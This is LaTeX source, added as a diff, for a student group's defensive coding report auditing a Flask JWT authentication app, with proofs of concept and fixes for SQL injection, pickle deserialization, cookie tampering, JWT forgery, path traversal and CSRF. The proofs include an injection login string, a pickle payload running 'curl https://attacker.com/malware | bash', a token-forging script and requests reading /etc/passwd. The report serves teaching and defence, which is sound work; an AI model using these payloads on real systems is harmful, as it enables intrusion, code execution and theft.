@@ -1,0 +1,692 @@
+\documentclass[11pt,a4paper]{article}
+
+% Packages
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage{microtype}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{booktabs}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage[margin=1in]{geometry}
+\usepackage{fancyhdr}
+\usepackage{tcolorbox}
+\usepackage{titlesec}
+
+\usepackage{graphicx}     % For images
+\usepackage{eso-pic}      % For background image
+\usepackage{transparent}
+
+% Colors
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.95}
+\definecolor{criticalcolor}{rgb}{0.8,0.1,0.1}
+\definecolor{highcolor}{rgb}{0.9,0.5,0.1}
+\definecolor{mediumcolor}{rgb}{0.9,0.9,0.1}
+\definecolor{fixedcolor}{rgb}{0.1,0.7,0.1}
+\definecolor{codeboring}{rgb}{0.8,0.5,0.5}
+
+% Listings settings
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+\lstset{style=mystyle}
+
+% Header and footer
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{JWT Authentication Security Audit}
+\fancyhead[R]{\thepage}
+\fancyfoot[C]{CONFIDENTIAL}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+
+% Title formatting
+\titleformat{\section}
+  {\normalfont\Large\bfseries}{\thesection}{1em}{}
+\titleformat{\subsection}
+  {\normalfont\large\bfseries}{\thesubsection}{1em}{}
+
+% Custom environment for vulnerabilities
+\newenvironment{vulnerability}[3]{%
+    \begin{tcolorbox}[
+        colback=white,
+        colframe=#1,
+        fonttitle=\bfseries\color{white},
+        coltitle=#1,
+        title=#2: #3
+    ]
+}{%
+    \end{tcolorbox}
+}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=cyan,
+    pdftitle={JWT Authentication Security Audit Report},
+    pdfpagemode=FullScreen,
+}
+
+\begin{document}
+
+\begin{titlepage}
+
+\AddToShipoutPictureBG*{%
+    \AtPageLowerLeft{
+     \transparent{0.15}
+        \includegraphics[width=800,height=900]{s.jpg}
+    }
+}
+    \centering
+    \vspace*{8cm}
+    % \includegraphics[width=0.4\textwidth]{example-image}\\[1cm]
+    {\Huge\bfseries Assignment 2 - Defensive coding report\\}
+    \vspace{1.5cm}
+    % {\Large\textbf{CONFIDENTIAL(Only for Mr Aman and Mr Tayebi's eyes)}}\\
+    \vspace{1cm}
+    % {\large\today}\\
+    \vfill
+    {\large Prepared for:\\
+    Mr. Tayebi and Aman\\}
+    \vspace{0.5cm}
+    {\large Prepared by:\\
+    Group 2(Jugal, Puru, Gitanshu, Sarthak, Adit, Prasana)\\}
+\end{titlepage}
+
+\tableofcontents
+\newpage
+
+\section{Executive Summary}
+
+This report documents a comprehensive security audit of a Flask-based authentication system implementing JWT (JSON Web Tokens). The audit identified multiple critical and high-severity vulnerabilities that could lead to unauthorized access, data breaches, and server compromise. Each vulnerability has been analyzed with proof-of-concept examples and appropriate remediation strategies.
+
+\subsection{Vulnerabilities Overview}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{clccc}
+\toprule
+\textbf{ID} & \textbf{Vulnerability} & \textbf{Severity} & \textbf{Impact} & \textbf{Status} \\
+\midrule
+V1 & SQL Injection & \textcolor{criticalcolor}{Critical} & Authentication bypass, data exposure & \textcolor{fixedcolor}{Fixed} \\
+V2 & Insecure Deserialization (Pickle) & \textcolor{criticalcolor}{Critical} & Remote code execution & \textcolor{fixedcolor}{Fixed} \\
+V3 & Client-side Privilege Control & \textcolor{highcolor}{High} & Privilege escalation & \textcolor{fixedcolor}{Fixed} \\
+V4 & JWT Implementation Flaws & \textcolor{highcolor}{High} & Token forgery, authentication bypass & \textcolor{fixedcolor}{Fixed} \\
+V5 & Path Traversal & \textcolor{highcolor}{High} & Unauthorized file access & \textcolor{fixedcolor}{Fixed} \\
+V6 & Missing Security Headers & \textcolor{mediumcolor}{Medium} & Various client-side attacks & \textcolor{fixedcolor}{Fixed} \\
+V7 & Plaintext Password Storage & \textcolor{mediumcolor}{Medium} & Credential exposure & \textcolor{fixedcolor}{Fixed} \\
+V8 & Dependency Vulnerabilities & \textcolor{codeboring}{Low} & Cookie Information Vulnerable & \textcolor{fixedcolor}{Fixed} \\
+\bottomrule
+\end{tabular}
+\caption{Summary of identified vulnerabilities}
+\label{tab:vuln_summary}
+\end{table}
+
+\section{Detailed Findings}
+
+\subsection{V1: SQL Injection}
+
+\begin{vulnerability}{criticalcolor}{Critical}{SQL Injection}
+\subsubsection*{Description}
+The application uses string interpolation to construct SQL queries with user-supplied input, allowing attackers to inject malicious SQL code.
+
+\subsubsection*{Proof of Concept}
+An attacker could login with the following credentials:
+
+\begin{lstlisting}[language={}]
+Username: admin' --
+Password: anything
+\end{lstlisting}
+
+This produces the following vulnerable SQL query:
+
+\begin{lstlisting}[language=SQL]
+SELECT * FROM users where username='admin' --' AND password='anything'
+\end{lstlisting}
+
+The \texttt{--} comments out the password check, allowing authentication as any user without knowing their password.
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Authentication bypass
+    \item Data exfiltration
+    \item Potential database destruction
+\end{itemize}
+
+\subsubsection*{Remediation}
+Implemented parameterized queries to prevent SQL injection:
+
+\begin{lstlisting}[language=Python]
+# Original vulnerable code
+rows = db.fetch_data(f"SELECT * FROM users where username='{username}' AND password='{password}'")
+
+# Fixed code
+user = db.fetch_data("SELECT * FROM users WHERE username = ?", (username,))
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{V2: Insecure Deserialization (Pickle)}
+
+\begin{vulnerability}{criticalcolor}{Critical}{Insecure Deserialization}
+\subsubsection*{Description}
+The application uses Python's \texttt{pickle} module to serialize and deserialize JWT tokens. Pickle deserialization of untrusted data allows attackers to execute arbitrary code on the server.
+
+\subsubsection*{Proof of Concept}
+An attacker could craft a malicious pickle payload:
+
+\begin{lstlisting}[language=Python]
+import pickle
+import os
+import base64
+
+class EvilPickle:
+    def __reduce__(self):
+        return (os.system, ('curl https://attacker.com/malware | bash',))
+
+# Create malicious pickle
+malicious = pickle.dumps(EvilPickle())
+hex_payload = malicious.hex()
+
+# Split like in the application logic
+obfuscated = hex_payload[len(hex_payload)//2:] + hex_payload[:len(hex_payload)//2]
+
+# The attacker would then set this as their token cookie
+\end{lstlisting}
+
+When the server deserializes this data with \texttt{pickle.loads()}, it executes the attacker's command.
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Remote code execution
+    \item Complete server compromise
+    \item Data breach
+\end{itemize}
+
+\subsubsection*{Remediation}
+Removed pickle serialization entirely and used standard JWT encoding/decoding:
+
+\begin{lstlisting}[language=Python]
+# Original vulnerable code
+token = auth_token[len(auth_token)//2:] + auth_token[:len(auth_token)//2]
+data = jwt.decode(pickle.loads(bytes.fromhex(token)), SECRET_KEY, algorithms=["HS256"])
+
+# Fixed code
+payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{V3: Client-side Privilege Control}
+
+\begin{vulnerability}{highcolor}{High}{Client-side Privilege Control}
+\subsubsection*{Description}
+The application sets an 'admin' cookie on the client-side to control administrative access, allowing attackers to modify this value and escalate privileges.
+
+\subsubsection*{Proof of Concept}
+An attacker could:
+\begin{enumerate}
+    \item Login as a regular user
+    \item Intercept the response using a web proxy
+    \item Modify the 'admin' cookie value from 'false' to 'true'
+    \item Access administrative functions
+\end{enumerate}
+
+\begin{lstlisting}[language=http]
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"username":"user1","password":"password1"}
+
+# Response (intercepted and modified)
+HTTP/1.1 200 OK
+Set-Cookie: token=eyJ0eXA...
+Set-Cookie: admin=true  <- Modified from 'false' to 'true'
+\end{lstlisting}
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Privilege escalation
+    \item Unauthorized access to admin functionality
+    \item File system access
+\end{itemize}
+
+\subsubsection*{Remediation}
+Removed client-controlled admin flag and stored privileges in the JWT token, verified server-side:
+
+\begin{lstlisting}[language=Python]
+# JWT payload now includes privilege level
+token = jwt.encode({
+    'username': username,
+    'privilege': user[0][3],
+    'exp': expiration
+}, SECRET_KEY, algorithm="HS256")
+
+# Access control check
+if current_user['privilege'] != 1:
+    return jsonify({"error": "Admin access required"}), 403
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{V4: JWT Implementation Flaws}
+
+\begin{vulnerability}{highcolor}{High}{JWT Implementation Flaws}
+\subsubsection*{Description}
+The JWT implementation had multiple flaws:
+\begin{itemize}
+    \item Static, hardcoded secret key
+    \item No token expiration
+    \item Insecure storage in cookies
+    \item Unnecessary and ineffective obfuscation
+\end{itemize}
+
+\subsubsection*{Proof of Concept}
+An attacker could extract and decode a valid JWT token, modify its contents, and re-encode it:
+
+\begin{lstlisting}[language=Python]
+# Decode obfuscated token
+obfuscated_token = "a7c6b5d4e3f2...1234"  # From cookie
+
+token_hex = obfuscated_token[len(obfuscated_token)//2:] + obfuscated_token[:len(obfuscated_token)//2]
+token_bytes = bytes.fromhex(token_hex)
+token = pickle.loads(token_bytes).decode()
+
+# Decode JWT
+payload = jwt.decode(token, "secret_key", algorithms=["HS256"])
+
+# Modify payload
+payload["username"] = "admin1"  # Escalate to admin
+
+# Re-encode
+new_token = jwt.encode(payload, "secret_key", algorithm="HS256")
+
+# Re-obfuscate
+new_bytes = pickle.dumps(new_token.encode())
+new_hex = new_bytes.hex()
+new_obfuscated = new_hex[len(new_hex)//2:] + new_hex[:len(new_hex)//2]
+\end{lstlisting}
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Identity spoofing
+    \item Privilege escalation
+    \item Session hijacking
+\end{itemize}
+
+
+
+\end{vulnerability}
+
+\begin{vulnerability}{highcolor}{High}{JWT Implementation Flaws}
+\subsubsection*{Remediation}
+Implemented proper JWT security practices:
+    \begin{lstlisting}[language=Python]
+# Generate cryptographically secure random key
+SECRET_KEY = secrets.token_hex(32)  # 256 bits of entropy
+
+# Add expiration time
+expiration = datetime.utcnow() + timedelta(hours=1)
+token = jwt.encode({
+    'username': username,
+    'privilege': user[0][3],
+    'exp': expiration
+}, SECRET_KEY, algorithm="HS256")
+
+# Secure cookie settings
+res.set_cookie(
+    "token", 
+    value=token, 
+    httponly=True,
+    secure=True,
+    samesite='Strict',
+    max_age=3600
+)
+\end{lstlisting}
+\end{vulnerability}
+\subsection{V5: Path Traversal}
+
+\begin{vulnerability}{highcolor}{High}{Path Traversal}
+\subsubsection*{Description}
+The file storage implementation doesn't sanitize filenames, allowing attackers to access files outside the intended directory.
+
+\subsubsection*{Proof of Concept}
+An attacker with admin access could:
+
+\begin{lstlisting}[language=http]
+POST /file HTTP/1.1
+Host: example.com
+Cookie: token=valid_admin_token; admin=true
+Content-Type: multipart/form-data; boundary=---------------------------1234567890
+
+-----------------------------1234567890
+Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
+Content-Type: text/plain
+
+(file content)
+-----------------------------1234567890--
+\end{lstlisting}
+
+This could write files outside the intended directory or overwrite system files.
+
+Similarly, an attacker could read sensitive files:
+
+\begin{lstlisting}[language=http]
+GET /file?filename=../../../etc/passwd HTTP/1.1
+Host: example.com
+Cookie: token=valid_token
+\end{lstlisting}
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Unauthorized access to system files
+    \item Information disclosure
+    \item Potential system compromise
+\end{itemize}
+
+\subsubsection*{Remediation}
+Implemented proper path sanitization and validation:
+
+\begin{lstlisting}[language=Python]
+# Sanitize filename to prevent path traversal
+safe_filename = os.path.basename(filename)
+file_path = os.path.join(self.storage_directory, safe_filename)
+
+# Additional validation to prevent directory traversal
+if not os.path.abspath(file_path).startswith(os.path.abspath(self.storage_directory)):
+    raise ValueError("Invalid file path")
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{V6: Missing Security Headers}
+
+\begin{vulnerability}{mediumcolor}{Medium}{Missing Security Headers}
+\subsubsection*{Description}
+The application lacks security headers for cookie protection and does not implement CSRF protections.
+
+\subsubsection*{Proof of Concept}
+An attacker could create a malicious website that makes requests to the vulnerable application:
+
+\begin{lstlisting}[language=html]
+<html>
+<body>
+<script>
+  // This script can access non-HttpOnly cookies
+  document.write("Your token: " + document.cookie);
+  
+  // CSRF attack to delete files if user is admin
+  fetch('https://vulnerable-app.com/file?filename=important.txt', {
+    method: 'DELETE',
+    credentials: 'include'  // Sends cookies
+  });
+</script>
+</body>
+</html>
+\end{lstlisting}
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Cross-site scripting (XSS)
+    \item Cross-site request forgery (CSRF)
+    \item Cookie theft
+\end{itemize}
+
+\subsubsection*{Remediation}
+Added proper security attributes to cookies:
+
+\begin{lstlisting}[language=Python]
+res.set_cookie(
+    "token", 
+    value=token, 
+    httponly=True,          # Prevents JavaScript access
+    secure=True,            # Only transmitted over HTTPS
+    samesite='Strict',      # CSRF protection
+    max_age=3600            # 1 hour expiration
+)
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{V7: Plaintext Password Storage}
+
+\begin{vulnerability}{mediumcolor}{Medium}{Plaintext Password Storage}
+\subsubsection*{Description}
+The application stores user passwords in plaintext, risking credential exposure in case of a data breach.
+
+\subsubsection*{Proof of Concept}
+If an attacker gains access to the database, they can directly read user passwords:
+
+\begin{lstlisting}[language=SQL]
+SELECT username, password FROM users;
+\end{lstlisting}
+
+Results:
+\begin{lstlisting}
+username | password
+---------|-----------
+user1    | password1
+admin1   | adminpassword1
+\end{lstlisting}
+
+\subsubsection*{Impact}
+\begin{itemize}
+    \item Credential exposure
+    \item Account takeover
+    \item Password reuse attacks
+\end{itemize}
+
+\subsubsection*{Remediation}
+Implemented password hashing:
+
+\begin{lstlisting}[language=Python]
+# During user creation
+hashed_password1 = generate_password_hash('password1')
+db.update_data("INSERT INTO users (username, password, privilege) VALUES (?, ?, ?)", 
+              ('user1', hashed_password1, 0))
+
+# During authentication
+if not user or not check_password_hash(user[0][2], password):
+    return jsonify({"error": "Invalid credentials"}), 401
+\end{lstlisting}
+\end{vulnerability}
+
+\subsection{Dependency Vulnerabilities}
+
+\begin{vulnerability}{codeboring}{Medium}{Dependencies Vulnerabilities}
+\subsubsection*{Description}
+Flask 2.2.2 – vulnerable to information exposure in the form of permanent session cookie when the following conditions are met:
+
+Werkzeug 2.2.2 – Affected by multiple high level vulnerabilities causing Denial of Service, Remote code execution, path traversal. For more info: refer this link .
+\\
+\subsection*{Proof of Concept}
+\begin{itemize}
+    \item The application is hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
+\item The application sets session.permanent = True.
+\item The application does not access or modify the session at any point during a request.
+\item SESSION\_REFRESH\_EACH\_REQUEST is enabled (the default).
+\item The application does not set a Cache-Control header to indicate that a page is private or should not be cached.
+\end{itemize}
+\subsection*{Impact}
+A response containing data intended for one client may be cached and sent to other clients. If the proxy also caches Set-Cookie headers, it may send one client's session cookie to other clients. Under these conditions, the Vary: Cookie header is not set when a session is refreshed (re-sent to update the expiration) without being accessed or modified.
+\subsection*{Remediation}
+Recommendation: Upgrade flask to version 2.2.5, 2.3.2 or higher and werkzeug to 2.5.2 or higher in requirements.txt.
+\begin{lstlisting}[language=Python]
+flask>=2.3.2
+werkzeug>=2.5.2
+\end{lstlisting}
+\end{vulnerability}
+
+
+\vspace{2300pt}
+\section{Complete Code Review}
+
+The following is a comprehensive analysis of the fixed code, highlighting the security improvements made to address the vulnerabilities identified in this report.
+
+\subsection{Authentication Flow}
+
+\begin{lstlisting}[language=Python]
+@app.route("/login", methods=["POST"])
+def login():
+    if not request.is_json:
+        return jsonify({"error": "Missing JSON in request"}), 400
+        
+    username = request.json.get("username")
+    password = request.json.get("password")
+    
+    if not username or not password:
+        return jsonify({"error": "Missing username or password"}), 400
+    
+    # Use parameterized query to prevent SQL injection
+    user = db.fetch_data("SELECT * FROM users WHERE username = ?", (username,))
+    
+    if not user or not check_password_hash(user[0][2], password):
+        return jsonify({"error": "Invalid credentials"}), 401
+    
+    # Create token with expiration
+    expiration = datetime.utcnow() + timedelta(hours=1)
+    token = jwt.encode({
+        'username': username,
+        'privilege': user[0][3],
+        'exp': expiration
+    }, SECRET_KEY, algorithm="HS256")
+    
+    res = make_response(jsonify({"message": "Login successful"}))
+    
+    # Set secure cookie
+    res.set_cookie(
+        "token", 
+        value=token, 
+        httponly=True,          # Prevents JavaScript access
+        secure=True,            # Only transmitted over HTTPS
+        samesite='Strict',      # CSRF protection
+        max_age=3600            # 1 hour expiration
+    )
+    
+    return res
+\end{lstlisting}
+
+\subsection{Authentication Middleware}
+
+\begin{lstlisting}[language=Python]
+def token_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.cookies.get('token')
+        
+        if not token:
+            return jsonify({'message': 'Token is missing'}), 401
+            
+        try:
+            # Decode JWT token
+            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
+            # Get the current user from the database
+            user = db.fetch_data("SELECT * FROM users WHERE username = ?", (payload['username'],))
+            
+            if not user:
+                return jsonify({'message': 'Invalid token'}), 401
+                
+            # Add user data to the request context
+            request.current_user = {
+                'username': user[0][1],
+                'privilege': user[0][3]
+            }
+        except jwt.ExpiredSignatureError:
+            return jsonify({'message': 'Token has expired'}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({'message': 'Invalid token'}), 401
+            
+        return f(*args, **kwargs)
+    return decorated
+\end{lstlisting}
+
+\subsection{File Operations}
+
+\begin{lstlisting}[language=Python]
+@app.route("/file", methods=["GET", "POST", "DELETE"])
+@token_required
+def store_file():
+    """
+    Only admins can upload/delete files.
+    All users can read files.
+    """
+    current_user = request.current_user
+    
+    if request.method == 'GET':
+        filename = request.args.get('filename')
+        if not filename:
+            return jsonify({"error": "Filename is required"}), 400
+            
+        content = fs.get(filename)
+        if content is None:
+            return jsonify({"error": "File not found"}), 404
+            
+        response = make_response(content)
+        response.headers.set('Content-Type', 'application/octet-stream')
+        response.headers.set('Content-Disposition', f'attachment; filename={os.path.basename(filename)}')
+        return response
+        
+    elif request.method == 'POST':
+        if current_user['privilege'] != 1:
+            return jsonify({"error": "Admin access required"}), 403
+            
+        if 'file' not in request.files:
+            return jsonify({"error": "No file part"}), 400
+            
+        uploaded_file = request.files['file']
+        if uploaded_file.filename == '':
+            return jsonify({"error": "No selected file"}), 400
+            
+        try:
+            fs.store(uploaded_file.filename, uploaded_file.read())
+            return jsonify({"message": f"File {uploaded_file.filename} uploaded successfully"})
+        except ValueError as e:
+            return jsonify({"error": str(e)}), 400
+\end{lstlisting}
+
+\section{Conclusion}
+
+The application contained multiple critical security vulnerabilities that could lead to complete system compromise. The remediated code addresses these issues by implementing security best practices:
+
+\begin{enumerate}
+    \item Parameterized queries to prevent SQL injection
+    \item Removal of insecure deserialization via pickle
+    \item Server-side privilege verification
+    \item Secure JWT implementation with proper token validation
+    \item Strict path validation to prevent directory traversal
+    \item Secure cookie configuration
+    \item Password hashing
+\end{enumerate}
+
+These changes significantly improve the security posture of the application. Regular security testing is recommended to maintain this improved security stance.
+
+\section{Recommendations}
+
+\begin{enumerate}
+    \item Implement a proper secret management solution rather than generating the secret key on application startup
+    \item Add rate limiting for login attempts to prevent brute force attacks
+    \item Implement logging for security events
+    \item Consider adding multi-factor authentication for administrative access
+    \item Implement Content Security Policy headers
+    \item Conduct regular security code reviews and penetration testing
+\end{enumerate}
+
+
+\end{document}
